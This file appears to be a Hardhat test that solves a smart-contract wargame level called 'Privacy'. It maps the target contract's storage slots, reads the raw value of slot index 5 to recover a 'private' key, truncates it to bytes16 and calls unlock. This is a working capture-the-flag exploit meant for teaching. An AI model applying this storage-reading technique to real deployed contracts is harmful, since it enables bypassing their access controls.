const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Privacy", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Privacy", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Storage variables occupy a total of 6 slots:
        //  - 1st slot - `bool locked`
        //  - 2nd slot - `uint256 ID`
        //  - 3rd slot - packed -> `uint8 flattening`; `uint8 denomination`; `uint16 awkwardness`;
        //  - 4-6th slots - `bytes32[3] data` elements

        // So the one we need to read is the one storing the element at index 2 of the `data` array
        // As we can see this is the last (6th) slot at index 5

        const slot = 6;
        const slotIdx = slot - 1;
        const secretKey = await ethers.provider.getStorageAt(instance.address, slotIdx);

        // Cast bytes32 to bytes16 by taking only the left-most bytes
        const key = secretKey.slice(0, secretKey.length - 16 * 2);

        // Unlock
        await instance.unlock(key);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});